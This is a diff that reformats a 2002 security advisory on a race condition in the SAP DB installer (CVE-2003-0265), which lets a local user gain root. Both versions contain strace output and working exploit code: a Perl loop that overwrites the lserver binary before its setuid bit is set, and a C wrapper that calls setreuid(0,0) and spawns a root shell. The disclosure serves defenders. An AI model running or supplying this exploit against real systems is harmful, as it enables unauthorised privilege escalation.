@@ -1,97 +1,112 @@
-                                Advisory #: 98
-Title: SAP Database Local Root Vulnerability During Installation
-Author:Larry W. Cashdollar, @_larry0
-Date: 2002-12-10
-Download Site: http://www.sapdb.org
-Vendor:SAP DB
-Vendor Notified: 2002-12-10
-Vendor Contact: Disclosed via iDefense
-Description: SAP DB is a Free Enterprise database (http://www.sapdb.org). An
-exploitable race condition exists during installation that can be won to yield
-root to a local malicous user. An executable is world writeable before a setuid
-bit is set by the installation program. This condition exists for both the
-production version 7.3.0.29 and the beta version 7.4.3.7 beta (www.sapdb.org/
-tgz_linux.htm).
-Vulnerability:
-Installation of the SAP database is done by the binary SDBINST. This first
-uncompresses the files, changes permissions and then runs a file integrity
-check. Once this check is completed setuid bits are added to two files. A large
-gap between this check and the setuid operation exists (a few seconds at i
-least). This gives us ample time to change the contents of the pre-setuid file.
-For the production 7.3.0.29 version: Before the setuid root bit is set, a log
-file is written to that a normal non-privilidged user can read. This file was
-located in /tmp/sapdb-server-linux-32bit-i386-7_3_0_29/y/config/install/. We
-simply watch that file for what is written to it just before the call to chmod
-and copy our malicious code over the target binary. Below is a partial analysis
-of SDBINST. chmod("/usr/sapdb/depend/pgm/lserver", 0100777) = 0 . . open("/tmp/
-sapdb-server-linux-32bit-i386-7_3_0_29/y/config/install/
-LIST7aad69a8$O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3 fstat64(3,
-{st_mode=S_IFREG|0644, st_size=0, ...}) = 0 fcntl64(0x3, 0x2, 0x1, 0x401a6ce0)
-= 0 fstat64(3, {st_mode=S_IFREG|0644, st_size=0, ...}) = 0 old_mmap(NULL, 4096,
-PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40024000 write(3,
-"\"lib/libsqlca.a\" f1d67919f97aa15"..., 4096) = 4096 write(3, "/PRECOM.ins\"
-6e00ace2afd80ec50a1"..., 4096) = 4096 . chmod("/usr/sapdb/depend/pgm/lserver",
-04775) = 0 For the Beta 7.4.3.7 version: All of the files are checked for data
-integrity before the setuid bit is set, the installation no longer writes to a
-log file during this operation. It appears that just before the setuid bit is
-set a directory is created /opt/sapdb/depend/wrk. It proved more difficult to
-win the race using this directory creation as an indicator to copy our file
-over. I was able to win the race with a timed copy after the last file had been
-written from the archive and just before the integrity check had finished.
-Below is an analysis of the installation program SDBRUN. chmod("/opt/sapdb/
-depend/pgm/lserver", 0777) = 0 . 20224 stat64("/opt/sapdb/depend/wrk",
-0x8150c20) = -1 ENOENT (No such file or directory) 20224 stat64("/opt/sapdb/
-depend", {st_mode=S_IFDIR|0775, st_size=4096, ...}) = 0 20224 mkdir("/opt/
-sapdb/depend/wrk", 0775) = 0 20224 chmod("/opt/sapdb/depend/wrk", 0775) = 0
-20224 stat64("/opt/sapdb/depend/wrk", {st_mode=S_IFDIR|0775, st_size=4096,
-...}) = 0 20224 chown32(0x872b640, 0x5456, 0x5456) = 0 20224 chown32(0x88c3f88,
-0, 0x5456) = 0 20224 chmod("/opt/sapdb/depend/pgm/dbmsrv", 04775) = 0 20224
-chown32(0x88c4870, 0, 0x5456) = 0 20224 chmod("/opt/sapdb/depend/pgm/lserver",
-04775) = 0 Local attackers can exploit this vulnerability to gain root access
-on a targeted system. The attacker would have needed previous knowledge of the
-system administrators SAP installation. To exploit the 7.4 beta version of this
-software an attacker would need to have a good idea of the target systems
-hardware type and speed.
-CVE-2003-0265
-JSON:Export
-Exploit Code:
-   1. #!/bin/perl
-   2.  
-   3. while (1) {
-   4.  
-   5. $test =`grep -sh PRECOM.ins /tmp/sapdb-server-linux-32bit-i386-7_3_0_29/
-      y/config/install/LIST*`;
-   6.  
-   7. if ( $test =~ /PRECOM/ ) {
-   8.        system("cp /home/lwc/run /usr/sapdb/depend/pgm/lserver");
-   9.         exit(1);
-  10. }
-  11. }
-  12.  
-  13. /*##Larry W. Cashdollar, lwc@vapid.dhs.org
-  14. ##This is just a wrapper to boost our privs from euid(0) to uid(0) guid
-      (0) */
-  15.  
-  16. #include <stdio.h>
-  17. #include <unistd.h>
-  18.  
-  19. int
-  20. main (void)
-  21. {
-  22. char *shell[2];
-  23. shell[0] = "sh";
-  24. shell[1] = NULL;
-  25. if (!setreuid (0, 0))
-  26. printf ("We have root, getting sgid perms and spawning shell.\n"); else
-  27. {
-  28.  
-  29.       printf ("Ack, We lost the race.\n");
-  30.       _exit (0);
-  31. }
-  32. setregid (0, 0);
-  33. execve ("/bin/sh", shell, NULL);
-  34. return(0);
-  35. }
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/
-sap_database_local_root_during_install.html
+
+                               Advisory #: 98
+
+   Title: SAP Database Local Root Vulnerability During Installation
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2002-12-10
+   Download Site: http://www.sapdb.org
+   Vendor: SAP DB
+   Vendor Notified: 2002-12-10
+   Vendor Contact: Disclosed via iDefense
+   Description: SAP DB is a Free Enterprise database
+   (http://www.sapdb.org). An exploitable race condition exists during
+   installation that can be won to yield root to a local malicous user. An
+   executable is world writeable before a setuid bit is set by the
+   installation program. This condition exists for both the production
+   version 7.3.0.29 and the beta version 7.4.3.7 beta
+   (www.sapdb.org/tgz_linux.htm).
+   Vulnerability:
+   Installation of the SAP database is done by the binary SDBINST. This
+   first uncompresses the files, changes permissions and then runs a file
+   integrity check. Once this check is completed setuid bits are added to
+   two files. A large gap between this check and the setuid operation
+   exists (a few seconds at i least). This gives us ample time to change
+   the contents of the pre-setuid file. For the production 7.3.0.29
+   version: Before the setuid root bit is set, a log file is written to
+   that a normal non-privilidged user can read. This file was located in
+   /tmp/sapdb-server-linux-32bit-i386-7_3_0_29/y/config/install/. We
+   simply watch that file for what is written to it just before the call
+   to chmod and copy our malicious code over the target binary. Below is a
+   partial analysis of SDBINST. chmod("/usr/sapdb/depend/pgm/lserver",
+   0100777) = 0 . .
+   open("/tmp/sapdb-server-linux-32bit-i386-7_3_0_29/y/config/install/LIST
+   7aad69a8$O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3 fstat64(3,
+   {st_mode=S_IFREG|0644, st_size=0, ...}) = 0 fcntl64(0x3, 0x2, 0x1,
+   0x401a6ce0) = 0 fstat64(3, {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
+   old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS,
+   -1, 0) = 0x40024000 write(3, "\"lib/libsqlca.a\" f1d67919f97aa15"...,
+   4096) = 4096 write(3, "/PRECOM.ins\" 6e00ace2afd80ec50a1"..., 4096) =
+   4096 . chmod("/usr/sapdb/depend/pgm/lserver", 04775) = 0 For the Beta
+   7.4.3.7 version: All of the files are checked for data integrity before
+   the setuid bit is set, the installation no longer writes to a log file
+   during this operation. It appears that just before the setuid bit is
+   set a directory is created /opt/sapdb/depend/wrk. It proved more
+   difficult to win the race using this directory creation as an indicator
+   to copy our file over. I was able to win the race with a timed copy
+   after the last file had been written from the archive and just before
+   the integrity check had finished. Below is an analysis of the
+   installation program SDBRUN. chmod("/opt/sapdb/depend/pgm/lserver",
+   0777) = 0 . 20224 stat64("/opt/sapdb/depend/wrk", 0x8150c20) = -1
+   ENOENT (No such file or directory) 20224 stat64("/opt/sapdb/depend",
+   {st_mode=S_IFDIR|0775, st_size=4096, ...}) = 0 20224
+   mkdir("/opt/sapdb/depend/wrk", 0775) = 0 20224
+   chmod("/opt/sapdb/depend/wrk", 0775) = 0 20224
+   stat64("/opt/sapdb/depend/wrk", {st_mode=S_IFDIR|0775, st_size=4096,
+   ...}) = 0 20224 chown32(0x872b640, 0x5456, 0x5456) = 0 20224
+   chown32(0x88c3f88, 0, 0x5456) = 0 20224
+   chmod("/opt/sapdb/depend/pgm/dbmsrv", 04775) = 0 20224
+   chown32(0x88c4870, 0, 0x5456) = 0 20224
+   chmod("/opt/sapdb/depend/pgm/lserver", 04775) = 0 Local attackers can
+   exploit this vulnerability to gain root access on a targeted system.
+   The attacker would have needed previous knowledge of the system
+   administrators SAP installation. To exploit the 7.4 beta version of
+   this software an attacker would need to have a good idea of the target
+   systems hardware type and speed.
+   CVE-2003-0265
+   JSON: Export
+   Exploit Code:
+
+    1. #!/bin/perl
+    2.
+    3. while (1) {
+    4.
+    5. $test =`grep -sh PRECOM.ins
+       /tmp/sapdb-server-linux-32bit-i386-7_3_0_29/y/config/install/LIST*`
+       ;
+    6.
+    7. if ( $test =~ /PRECOM/ ) {
+    8. system("cp /home/lwc/run /usr/sapdb/depend/pgm/lserver");
+    9. exit(1);
+   10. }
+   11. }
+   12.
+   13. /*##Larry W. Cashdollar, lwc@vapid.dhs.org
+   14. ##This is just a wrapper to boost our privs from euid(0) to uid(0)
+       guid(0) */
+   15.
+   16. #include <stdio.h>
+   17. #include <unistd.h>
+   18.
+   19. int
+   20. main (void)
+   21. {
+   22. char *shell[2];
+   23. shell[0] = "sh";
+   24. shell[1] = NULL;
+   25. if (!setreuid (0, 0))
+   26. printf ("We have root, getting sgid perms and spawning shell.\n");
+       else
+   27. {
+   28.
+   29. printf ("Ack, We lost the race.\n");
+   30. _exit (0);
+   31. }
+   32. setregid (0, 0);
+   33. execve ("/bin/sh", shell, NULL);
+   34. return(0);
+   35. }
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/sap_database_local_root_during_inst
+   all.html
